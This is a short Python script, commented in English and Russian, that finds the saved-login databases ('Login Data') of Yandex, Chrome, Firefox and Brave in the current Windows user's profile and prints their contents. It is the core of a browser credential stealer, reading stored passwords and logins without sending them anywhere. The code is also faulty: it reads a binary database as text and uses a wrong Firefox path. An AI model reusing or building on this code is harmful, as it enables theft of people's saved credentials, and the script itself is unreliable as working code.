import os

browse ={
    "Yandex":"YandexBrowser",
    "Google":'Chrome',
    'Mozilla':'Firefox',          ### Dictionary with browser name ###
    "BraveSoftware":'Brave-Browser'

}
user_name = os.getlogin() ### Getting the user name ###

for key,valye in browse.items(): ###the cycle with checking browsers###
    way = fr'C:\Users\{user_name}\AppData\Local\{key}\{valye}\User Data\Default' ###the path to the file folder Login Data###
    if os.path.isdir(way):
        print(f"{key} найден")
        txt = open(way + '\\' + "Login Data")
        for i in txt:
            print(i)  ### output of file contents ###
    else:
        print(f"{key} не найден!")